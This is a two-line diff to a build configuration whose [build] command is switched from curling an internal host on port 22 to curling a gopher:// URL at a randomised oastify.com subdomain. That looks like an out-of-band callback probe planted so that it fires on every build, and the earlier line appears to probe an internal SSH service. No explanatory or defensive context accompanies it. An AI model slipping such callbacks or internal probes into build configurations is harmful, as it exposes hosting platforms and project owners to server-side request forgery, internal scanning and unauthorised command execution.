@@ -1,2 +1,2 @@
 [build]
-  command = "curl http://local.jeni.sh:22"
+  command = "curl gopher://vkjblfsyh1tmk86iqaojmqrvamgd42.oastify.com"
